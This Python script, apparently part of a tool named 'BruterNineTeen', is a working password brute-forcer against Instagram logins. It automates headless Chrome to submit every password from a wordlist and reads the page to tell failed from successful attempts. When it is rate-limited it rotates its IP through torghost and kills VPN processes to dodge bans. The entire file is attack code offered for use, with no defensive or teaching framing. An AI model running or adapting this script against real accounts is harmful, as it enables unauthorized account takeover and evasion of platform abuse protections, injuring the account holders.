#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.chrome.service import Service
from clint.textui import colored
from selenium.webdriver.common.keys import Keys
import subprocess
import time
import os
import sys
import random
a=subprocess.check_output(["id"])
ip_counter=1
ip_counter_openvpn=1
if not "root" in a.decode():
    print(colored.red("[-]This Feature Requires Root Permission. Please Be Sure That You Are Root!"))
    exit()
def ip_changer_tor():
    tor_network=["sudo xterm -e killall openvpn && sudo xterm -e killall autovpn && sudo xterm -e torghost -x && sudo xterm -e torghost -s"]
    os.system("sudo xterm -e killall xterm")
    os.system(str(tor_network[0]))
with open("Passwords/entered_passwords.txt","w") as f:
    f.write("BruterNineTeen Entered Passwords:\n----------------------------------\n")
with open("Passwords/not_entered_passwords.txt","w") as fil:
    fil.write("BruterNineTeen Not Entered Passwords:\n----------------------------------\n")
def start_insta(username):
    global driver
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('disable-infobars')
    options.add_experimental_option('prefs', {'intl.accept_languages': 'en,en_US'})
    options.add_argument("user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36")
    loc=os.getcwd()
    serv=Service("%s/path/chromedriver"%loc)
    driver = webdriver.Chrome(options=options,service=serv)
    driver.get("https://instagram.com")
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[2]/div/label/input"))).send_keys(username)
def ig_brute(username,password_wordlist):
    global ip_counter
    #global ip_counter_openvpn
    ip_changer_tor()
    ip_counter+=1
    ip_adr=subprocess.check_output(["curl","icanhazip.com","-s"])
    ip_adr=ip_adr.decode()
    print(colored.red("-")*50)
    print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("Your Ip Address Has Been Changed To:")+colored.blue(str(ip_adr)))
    print(colored.red("[")+colored.magenta("!")+colored.red("]")+colored.yellow("Speed Of The Attack Depends On The Proxy Server.It Could Be Fast Or Slow."))
    print(colored.red("-")*50)
    start_insta(username)
    x=0
    while(x<=len(password_wordlist)):
        try:
            WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(Keys.CONTROL,"a",Keys.DELETE)
            WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(password_wordlist[x])
            
            time.sleep(2.5)
            
        except KeyboardInterrupt:
            print(colored.red("[-]CTRL+C DETECTED EXITING..."))
            exit()
        except:
            pass
        try:
            captcha=WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[7]/p'))).text
            if "your password was incorrect." in captcha:
                if x < 0:
                    print(colored.red("[-]Password Is Not:")+colored.magenta(password_wordlist[x]))
                    with open("Passwords/entered_passwords.txt","a+") as fi:
                        fi.write("\n"+password_wordlist[x])
                else:
                    print(colored.red("[-]Password Is Not:")+colored.magenta(password_wordlist[x]))
                    with open("Passwords/entered_passwords.txt","a+") as fi:
                        fi.write("\n"+password_wordlist[x])
            elif "a problem" in captcha or "couldn't connect to Instagram" in captcha or "wait" in captcha:
                if x>0:
                    x=x-1  
                driver.close()
                print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("This Ip Address Is Banned. Changing The Ip Address"))
                ip_changer_tor()
                ip_counter+=1
                ip_adr=subprocess.check_output(["curl","icanhazip.com","-s"])
                ip_adr=ip_adr.decode()
                print(colored.red("-")*50)
                print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("Your Ip Address Has Been Changed To:")+colored.blue(str(ip_adr)))
                print(colored.red("[")+colored.magenta("!")+colored.red("]")+colored.yellow("Speed Of The Attack Depends On The Proxy Server.It Could Be Fast Or Slow."))
                print(colored.red("-")*50)
                start_insta(username)
                WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(Keys.CONTROL,"a",Keys.DELETE)
                WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(password_wordlist[x])
                time.sleep(2.5)
            else:
                print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x-1]))
                
        except KeyboardInterrupt:
            print(colored.red("[-]CTRL+C DETECTED EXITING..."))
            exit()
        except:
            try:
                WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/nav/div[2]/div/div/div[1]/a/div/div/img'))).click()
                print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
                break
                exit()
            except KeyboardInterrupt:
                print(colored.red("[-]CTRL+C DETECTED EXITING..."))
                exit()
            except:
                try:
                    WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/div/div/header/div[2]/div/div/div[1]/a/div/div/img'))).click()
                    print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
                    break
                    exit()
                except:
                    try:
                        driver.close()
                        print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("This Ip Address Is Banned. Changing The Ip Address"))
                        ip_changer_tor()
                        ip_counter+=1
                
                        ip_adr=subprocess.check_output(["curl","icanhazip.com","-s"])
                        ip_adr=ip_adr.decode()
                        print(colored.red("-")*50)
                        print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("Your Ip Address Has Been Changed To:")+colored.blue(str(ip_adr)))
                        print(colored.red("[")+colored.magenta("!")+colored.red("]")+colored.yellow("Speed Of The Attack Depends On The Proxy Server.It Could Be Fast Or Slow."))
                        print(colored.red("-")*50)
                        start_insta(username)
                        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(Keys.CONTROL,"a",Keys.DELETE)
                        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(password_wordlist[x])
                        time.sleep(2)
                    except:
                        print(colored.red("[-]Password Is Not In The Wordlist That You Provided!"))
        x+=1
    for j in password_wordlist:
        with open("Passwords/entered_passwords.txt","r") as fenerbahce:
            same=fenerbahce.readlines()
        if not j in same:
            with open("Passwords/not_entered_passwords.txt","a+") as file:
                file.write(j)
